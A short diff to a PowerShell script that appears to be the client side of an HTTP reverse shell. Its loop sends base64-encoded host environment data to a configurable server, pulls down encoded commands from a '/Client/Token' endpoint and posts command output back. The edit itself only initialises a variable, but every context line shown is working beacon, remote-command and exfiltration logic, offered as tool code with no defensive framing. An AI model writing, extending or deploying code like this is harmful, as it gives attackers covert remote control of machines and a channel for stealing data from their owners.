@@ -70,7 +70,7 @@ function Send-HttpRequest {
 while ($true) {
    if ($server -notlike "http*") { $server = "http://" + $server }
    $env = GetEnviron ; $invoke64 = $null ; if ($sleeps) { Start-Sleep $sleeps }
-   $token = $null ; $errorlog = $null ; $getenv64 = $(R64Encoder -t $env) 2> $null
+   $commandx = $null ; $token = $null ; $errorlog = $null ; $getenv64 = $(R64Encoder -t $env) 2> $null
    $request1 = $(Send-HttpRequest "$server/api/v1/Client/Info" "POST" "Info: $getenv64") 2> $null
    $response = $($token = Send-HttpRequest "$server/api/v1/Client/Token" "GET") 2> $null
    $response = $($invoke64 = R64Decoder -t ($token.Split(" ")[-1])) 2> $null
@@ -97,4 +97,3 @@ while ($true) {
    else { if (!$commandx) { $commandx = "HTTPShellNull" }}
    $output64 = $(R64Encoder -t $commandx) 2> $null ; [string]$path = $param
    $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2> $null }}
-
